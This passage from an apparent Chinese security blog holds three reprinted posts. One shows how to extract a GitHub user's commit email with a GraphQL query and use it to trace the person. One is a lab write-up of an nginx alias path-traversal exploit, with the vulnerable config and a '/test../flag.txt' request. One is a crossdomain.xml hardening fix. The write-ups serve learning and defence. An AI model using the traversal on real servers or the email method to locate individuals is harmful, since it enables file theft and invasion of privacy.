-<p>本文转自<a target="_blank" rel="noopener" href="https://www.ixiqin.com/2020/01/08/how-to-find-a-person-through-making/#:~:text=%E6%83%B3%E8%A6%81%E9%80%9A%E8%BF%87%20Git%20%E6%89%BE%E5%88%B0%E4%B8%80%E4%B8%AA%E4%BA%BA%E7%9A%84%E9%82%AE%E7%AE%B1%EF%BC%8C%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%96%B9%E6%B3%95%E5%B0%B1%E6%98%AF%E4%BD%BF%E7%94%A8%20Github%20%E6%8F%90%E4%BE%9B%E7%9A%84%20GraphQL%20%E6%9D%A5%E8%BF%9B%E8%A1%8C%E6%9F%A5%E8%AF%A2%EF%BC%8C%E7%AE%80%E5%8D%95%E6%96%B9%E4%BE%BF%E3%80%82%20%E8%AE%BF%E9%97%AE,in%20%EF%BC%8C%E4%BD%BF%E7%94%A8%E4%BD%A0%E7%9A%84%20Github%20%E8%B4%A6%E5%8F%B7%E7%99%BB%E9%99%86%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%B0%83%E7%94%A8%20Github%20%E7%9A%84%20API%20%E4%BA%86%E3%80%82">白宦成</a> 并作补充</p>
-</blockquote>
-<blockquote>
-<p>很多时候，我们都需要找到一个人的联系方式。但是，并不是每一次我们都可以很好的拿到他的联系方式，这个时候，我们就需要借助一些奇技淫巧来找到一个人的联系方式。</p>
-</blockquote>
-<h2><span id="requirements">Requirements</span></h2><blockquote>
-<p>Github 账号</p>
-<p>你要找的人的 GitHub 账号（需要其账号下有仓库）</p>
-</blockquote>
-<h2><span id="原理">原理</span></h2><blockquote>
-<p>在我们使用 Git 进行版本控制时，一开始，我们会被要求设置一个 Git 的用户名和邮箱，就像下面这样。</p>
-<p><img src="/2023/09/03/Github-Find-Email/1.png" alt="image"></p>
-<p>后续，我们的每一个 Commit 都会基于我们填写的用户名和邮箱来进行存储。我们只需要查询一个人在 Github 的提交记录，就可以找到他填写在 Git 中的邮箱和名字，从而方便我们更进一步找到这个人。</p>
-</blockquote>
-<h2><span id="实践">实践</span></h2><blockquote>
-<p>想要通过 Git 找到一个人的邮箱，最简单的方法就是使用 Github 提供的 GraphQL 来进行查询，简单方便。</p>
-<p>访问Github 的 GraphQL API Explorer，点击右侧的 Sign in ，使用你的 Github 账号登陆，这样就可以调用 Github 的 API 了。</p>
-<p><img src="/2023/09/03/Github-Find-Email/2.png" alt="image"></p>
-<p>登陆后，你下方的 GraphQL 输入框就可以输入内容了。在其中输入如下代码</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  repository(name: <span class="string">&quot;grank&quot;</span>, owner: <span class="string">&quot;lctt&quot;</span>) &#123;</span><br><span class="line">    ref(qualifiedName: <span class="string">&quot;master&quot;</span>) &#123;</span><br><span class="line">      target &#123;</span><br><span class="line">        ... on Commit &#123;</span><br><span class="line">          id</span><br><span class="line">          <span class="title function_">history</span><span class="params">(first: <span class="number">5</span>)</span> &#123;</span><br><span class="line">            edges &#123;</span><br><span class="line">              node &#123;</span><br><span class="line">                author &#123;</span><br><span class="line">                  name</span><br><span class="line">                  email</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>并将 name 替换为你要查询的人的 repo 名，owner 改为你需要查询的人的名字，然后点击执行按钮。</p>
-<p><img src="/2023/09/03/Github-Find-Email/3.png" alt="image"></p>
-<p>右侧会出现你的执行结果，你会发现，其中出现我们想要的“邮箱”地址。</p>
-<p><img src="/2023/09/03/Github-Find-Email/4.png" alt="image"></p>
-<p>你会发现，这里其实有两种类型的邮箱，一种是我们常见的，自己用的各种免费邮箱，比如 @qq.com、@gmail.com、@foxmail.com 之类的；另一种是形如 27856297+dependabot-preview[bot]@users.noreply.github.com 这样的邮箱。</p>
-<p>这两种邮箱的区别是，前者是我们自己通过 git 设置的邮箱，而后者则是我们通过 Github 网页、 API 操作产生的 commit 。你在查询的时候，要记得去找第一类邮箱来作为参考。</p>
-<p>当然，不排除有开发者在看了本篇文章后，去用 private 邮箱修改自己本地的 Git ，那就没办法了。</p>
-<p>找到这个邮箱以后怎么办呢？</p>
-<p>直接发邮件联系<br>如果是 QQ 邮箱、 Foxmail ，可以试着直接用邮箱，或者邮箱里的 QQ 号加好友。<br>通过 Google 搜索这个邮箱，查找其他的关联信息。</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Github/" rel="tag">Github</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/09/03/Nginx-Alias/">
-                Nginx错误配置alias导致目录遍历漏洞
-            </a>
-        </h2>
-    
-    <time>
-        Sep 3, 2023
-    </time>
-    <section class="content">
-        <h1><span id="nginx错误配置alias导致目录遍历漏洞">Nginx错误配置alias导致目录遍历漏洞</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blackwolfsec.cc/2018/05/23/Nginx_alias_misconfig_path_traversle/">BlackWolf</a> 并作补充</p>
-</blockquote>
-<h2><span id="0x00-前言">0x00 前言</span></h2><blockquote>
-<p>nginx错误配置alias，导致存在目录遍历，可跳出限制读取上一层目录及其任意子目录的文件的任意文件。</p>
-</blockquote>
-<h2><span id="0x01-环境搭建">0x01 环境搭建</span></h2><blockquote>
-<p>使用richarvey&#x2F;nginx-php-fpm镜像</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:80  richarvey/nginx-php-fpm</span><br></pre></td></tr></table></figure>
-
-<p>配置nginx，添加配置test路由解析到&#x2F;var&#x2F;www&#x2F;html&#x2F;路径（注意：&#x2F;test没有结尾的&#x2F;）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># /etc/nginx/sites-available/default.conf</span><br><span class="line">location /test &#123;</span><br><span class="line">        alias /var/www/html/;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>对应Web服务的文件结构，目标是目录遍历获取flag.txt的内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">|--var</span><br><span class="line">   |--www</span><br><span class="line">      |--flag.txt</span><br><span class="line">      |--html</span><br><span class="line">         |--index.php</span><br><span class="line">         |--test.txt</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h2><span id="0x02-漏洞利用">0x02 漏洞利用</span></h2><blockquote>
-<p>通过访问<a target="_blank" rel="noopener" href="http://127.0.0.1/test/test.txt">http://127.0.0.1/test/test.txt</a></p>
-<p>可以成功访问到test的内容如下(&#x2F;test&#x2F;test.txt路由请求，经处理后转换成：&#x2F;var&#x2F;www&#x2F;html&#x2F;test.txt)：</p>
-<p><code>this is a test</code></p>
-<p>修改请求为<a target="_blank" rel="noopener" href="http://127.0.0.1/test../flag.txt%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%88%90%E5%8A%9F%E8%B7%B3%E5%88%B0%E4%B8%8A%E4%B8%80%E5%B1%82%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E8%AF%BB%E5%8F%96%E5%88%B0flag.txt%E7%9A%84%E5%86%85%E5%AE%B9(%60/test../flag.txt%60%E8%B7%AF%E7%94%B1%E8%AF%B7%E6%B1%82%EF%BC%8C%E7%BB%8F%E5%A4%84%E7%90%86%E5%90%8E%E8%BD%AC%E6%8D%A2%E6%88%90%EF%BC%9A%60/var/www/flag.txt%60)">http://127.0.0.1/test../flag.txt，可以成功跳到上一层目录下，读取到flag.txt的内容(`/test../flag.txt`路由请求，经处理后转换成：`/var/www/flag.txt`)</a></p>
-<p><code>you get me, hahaha</code></p>
-</blockquote>
-<h2><span id="0x03-小结">0x03 小结</span></h2><blockquote>
-<p>只能跳到上一层目录，读取上一层目录及其任意子目录的文件，不能任意目录遍历读取任意文件,有局限性。</p>
-<p>需要nginx配置缺陷，实战情况比较有限，但是真实存在（如：参考链接3）。</p>
-<p>一种场景是：很多网站会把备份文件放置在网页目录的上一层路径下，利用遍历读取备份文件；另一种场景是：路由限制到上传或静态图片路径，利用遍历读取上一层路径下的配置文件等。</p>
-</blockquote>
-<h2><span id="0x04-参考链接">0x04 参考链接</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md">https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md</a><br><a target="_blank" rel="noopener" href="https://hackerone.com/reports/317201">https://hackerone.com/reports/317201</a><br><a target="_blank" rel="noopener" href="https://hackerone.com/reports/312510">https://hackerone.com/reports/312510</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nginx/" rel="tag">Nginx</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/09/03/Crossdomain-XML/">
-                怎么把网站crossdomain.xml配置风险去除
-            </a>
-        </h2>
-    
-    <time>
-        Sep 3, 2023
-    </time>
-    <section class="content">
-        <h1><span id="怎么把网站crossdomainxml配置风险去除">怎么把网站crossdomain.xml配置风险去除</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://codeantenna.com/a/AoJYq0YYQe">nanjingbolg</a> 并作补充</p>
-</blockquote>
-<blockquote>
-<p>打开程序目录下的crossdomain.xml文件，确保配置只对提供安全资源的可信域开放：</p>
-<p>源代码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=”1.0″?&gt;&lt;!DOCTYPE cross-domain-policy SYSTEM ”http://www.macromedia.com/xml/dtds/cross-domain-policy.dtd”&gt;&lt;cross-domain-policy&gt;&lt;allow-access-from domain=”*” /&gt;&lt;/cross-domain-policy&gt;</span><br></pre></td></tr></table></figure>
-
-<p>文件中的allow-access-from 实体设置为星号设置为允许任何域访问，将其修改为:</p>
-<p><code>&lt;allow-access-from domain=”*.17showshow.com” /&gt;</code></p>
-<p>*.17showshow.com 换为您自己的域名(注意是一级域名)。</p>
-<p>表示只允许本域访问，该问题就解决了。</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XML/" rel="tag">XML</a>
             </div>
         
 
